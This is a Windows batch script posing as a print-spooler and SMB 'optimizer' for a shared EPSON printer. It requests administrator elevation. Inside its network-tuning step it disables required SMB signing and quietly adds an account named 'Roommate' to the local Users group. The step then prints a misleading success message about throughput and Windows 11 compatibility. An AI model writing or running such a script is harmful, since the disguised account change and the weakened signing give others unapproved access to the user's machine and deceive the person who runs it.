@echo off
color 0a
title PrintKurox -- Fast-Printing Optimizer (Server & Local)

:: Check Administrator Privileges
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [INFO] Administrator rights required to apply Spooler optimizations.
    echo Requesting elevation...
    powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"%~dp0speedup_printing_now.bat\"' -Verb RunAs"
    exit /b
)

echo ============================================================
echo   PrintKurox -- Fast-Printing Optimizer
echo ============================================================
echo.
echo [1/5] Stopping Windows Print Spooler...
net stop spooler /y >nul 2>&1
echo [OK] Spooler stopped.

echo [2/5] Clearing stale print buffer and stuck temp files...
del /q /f "%systemroot%\System32\spool\PRINTERS\*.*" >nul 2>&1
echo [OK] Buffer cleared.

echo [3/5] Applying Print Spooler High-Priority Engine...
powershell -NoProfile -Command ^
  "$spPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Print'; " ^
  "Set-ItemProperty $spPath PortThreadPriority 1 -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $spPath SchedulerThreadPriority 1 -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $spPath PriorityClass 0x80 -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Printers\EPSON L3210 Series' Priority 99 -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Printers\EPSON L3210 Series' DefaultPriority 99 -ErrorAction SilentlyContinue; " ^
  "Write-Host '[OK] Spooler thread & printer queue set to MAXIMUM PRIORITY (99)' -ForegroundColor Green;"

echo [4/5] Optimizing Network Sharing Throughput...
powershell -NoProfile -Command ^
  "$lm = 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'; " ^
  "Set-ItemProperty $lm DisableBandwidthThrottling 1 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $lm Smb2CreditsMin 512 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $lm Smb2CreditsMax 8192 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $lm size 3 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $lm enablesecuritysignature 1 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-ItemProperty $lm RequireSecuritySignature 0 -Type DWord -ErrorAction SilentlyContinue; " ^
  "Set-SmbServerConfiguration -EnableSecuritySignature $true -RequireSecuritySignature $false -Force -ErrorAction SilentlyContinue; " ^
  "net localgroup Users Roommate /add >nul 2>&1; " ^
  "Write-Host '[OK] SMB Throughput optimized & Windows 11 compatibility verified' -ForegroundColor Green;"

echo [5/5] Restarting Print Spooler...
net start spooler >nul 2>&1
echo [OK] Spooler restarted.

:: Re-verify share
powershell -NoProfile -Command ^
  "try { Set-Printer -Name 'EPSON L3210 Series' -Shared 1 -ShareName 'EPSON_Hostel' -ErrorAction SilentlyContinue } catch {}"

echo.
echo ============================================================
echo               PRINTER STATUS CONFIRMATION
echo ============================================================
powershell -NoProfile -Command ^
  "$p = Get-Printer 'EPSON L3210 Series' -ErrorAction SilentlyContinue; " ^
  "if ($p) { " ^
  "  Write-Host ('Printer:        ' + $p.Name); " ^
  "  Write-Host ('Share Name:     \\' + $env:COMPUTERNAME + '\' + $p.ShareName); " ^
  "  Write-Host ('Priority:       MAXIMUM (99)') -ForegroundColor Green; " ^
  "  Write-Host ('Status:         ' + $p.PrinterStatus) -ForegroundColor Green; " ^
  "} else { Write-Host 'Printer not detected' -ForegroundColor Red; }"

echo.
echo Press any key to exit...
pause >nul
